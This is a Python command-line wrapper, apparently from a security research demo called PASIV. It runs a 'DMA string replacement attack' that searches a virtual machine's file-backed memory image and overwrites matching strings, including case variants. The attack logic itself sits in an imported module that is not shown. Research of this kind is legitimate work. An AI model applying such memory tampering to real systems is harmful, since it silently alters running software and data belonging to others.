#!/usr/bin/env python3
"""
PASIV Welcome HACK Attack - Command Line Version
Direct "Welcome back" to "Welcome HACK" replacement via file-backed DMA
"""

import sys
import argparse
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from file_based_dma_attack import FileDMAAttacker

def main():
    parser = argparse.ArgumentParser(description='PASIV DMA String Replacement Attack')
    parser.add_argument('search', help='String to search for')
    parser.add_argument('replace', help='String to replace with')
    parser.add_argument('--memory-file', default='./pasiv_vm_memory.img', 
                       help='Path to VM memory file (default: ./pasiv_vm_memory.img)')
    parser.add_argument('--max-replacements', type=int, default=10,
                       help='Maximum number of replacements (default: 10)')
    parser.add_argument('--case-variants', action='store_true',
                       help='Also search for case variations (Title Case, UPPER, lower)')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.memory_file):
        print(f"❌ Memory file not found: {args.memory_file}")
        print("💡 Make sure VM is running with file-backed memory")
        sys.exit(1)
    
    print("🎯 PASIV DMA String Replacement Attack")
    print("=" * 50)
    print(f"📁 Memory file: {args.memory_file}")
    print(f"🎯 Target: '{args.search}' → '{args.replace}'")
    print(f"📊 Max replacements: {args.max_replacements}")
    
    try:
        attacker = FileDMAAttacker(args.memory_file)
        
        search_terms = [args.search]
        
        # Add case variations if requested
        if args.case_variants:
            search_terms.extend([
                args.search.title(),  # Title Case
                args.search.upper(),  # UPPER CASE
                args.search.lower()   # lower case
            ])
            # Remove duplicates while preserving order
            search_terms = list(dict.fromkeys(search_terms))
            print(f"🔍 Searching for variants: {search_terms}")
        
        total_replacements = 0
        
        for search_term in search_terms:
            print(f"\n🔍 Searching for '{search_term}'...")
            
            results = attacker.search_and_replace(
                search_term, 
                args.replace, 
                max_replacements=args.max_replacements
            )
            
            if results:
                print(f"✅ Made {len(results)} replacements:")
                for addr, old_text, new_text in results:
                    print(f"  📍 0x{addr:x}: '{old_text}' → '{new_text}'")
                total_replacements += len(results)
            else:
                print(f"❌ No instances of '{search_term}' found")
        
        print(f"\n🎯 Attack Complete: {total_replacements} total replacements made")
        
    except Exception as e:
        print(f"❌ Error: {e}")
        sys.exit(1)
        
    finally:
        if 'attacker' in locals():
            attacker.close_memory()
            print("🔒 Memory access closed")

if __name__ == "__main__":
    main() 